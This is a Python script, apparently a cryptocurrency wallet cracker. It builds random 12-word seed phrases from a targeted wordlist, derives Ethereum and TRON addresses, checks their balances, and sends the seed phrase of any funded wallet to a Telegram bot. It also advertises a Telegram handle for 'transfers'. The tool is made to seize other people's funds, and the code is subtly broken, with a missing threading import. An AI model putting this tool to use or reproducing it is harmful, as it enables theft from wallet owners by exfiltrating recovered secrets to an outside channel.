import random
import requests
import time
from web3 import Web3
from eth_account import Account
from decimal import Decimal
from tronpy import Tron
from tronpy.providers import HTTPProvider
from tronpy.keys import PrivateKey

# Configuration
INFURA_ID = 'your_infura_id_here'  # No personal data
TRON_API_KEY = 'your_tron_api_key_here'  # No personal data
TELEGRAM_BOT_TOKEN = 'your_bot_token_here'  # Replace with your own bot token
TELEGRAM_CHAT_ID = 'your_chat_id_here'  # Replace with your own chat ID
DELAY_BETWEEN_CHECKS = 0.1
TARGET_WORDLIST = "D:\\lou\\targeted_wordlist.txt"  # Targeted words list

# Initialize Web3 and Tron
w3 = Web3(Web3.HTTPProvider(f'https://mainnet.infura.io/v3/{INFURA_ID}'))
tron = Tron(HTTPProvider(api_key=TRON_API_KEY))

# Load targeted wordlist
with open(TARGET_WORDLIST, 'r', encoding='utf-8') as file:
    words = [word.strip() for word in file if word.strip()]

if len(words) < 12:
    print("Error: The wordlist must contain at least 12 words.")
    exit()

# Telegram alert
def send_telegram_alert(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': message}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"Telegram error: {str(e)}")

# Wallet checking logic
def check_wallet(mnemonic):
    try:
        # Ethereum
        eth_account = Account.from_mnemonic(mnemonic, account_path="m/44'/60'/0'/0/0")
        eth_address = w3.to_checksum_address(eth_account.address)
        eth_balance = Decimal(w3.eth.get_balance(eth_address)) / Decimal(10**18)

        # TRON (using ETH privkey)
        priv_key = PrivateKey(bytes.fromhex(eth_account.key.hex()))
        tron_addr = priv_key.public_key.to_base58check_address()
        trx_balance = tron.get_account_balance(tron_addr)

        # Combined detection logic
        if eth_balance > 0 or trx_balance > 0:
            message = (
                f"Funds Detected!\n"
                f"🔑 Mnemonic: ||{mnemonic}||\n"
                f"📬 ETH: {eth_address} - {eth_balance:.6f} ETH\n"
                f"📬 TRX: {tron_addr} - {trx_balance:.6f} TRX\n"
                f"⚠️ For transfers, please contact me on Telegram: @crakerhub"
            )
            send_telegram_alert(message)
            print(f"✅ Wallet found! ETH or TRX present.")
            return True
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

# Generate and check wallet in parallel
def generate_and_check_forever():
    Account.enable_unaudited_hdwallet_features()
    while True:
        mnemonic = " ".join(random.sample(words, 12))
        if check_wallet(mnemonic):
            print("Wallet with funds found!")
        time.sleep(DELAY_BETWEEN_CHECKS)

# Start the wallet checking process
def start_threads(thread_count=5):
    for _ in range(thread_count):
        t = threading.Thread(target=generate_and_check_forever)
        t.start()

if __name__ == "__main__":
    try:
        start_threads(10)  # Start 10 threads to parallelize the wallet checks
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nScript stopped by user.")
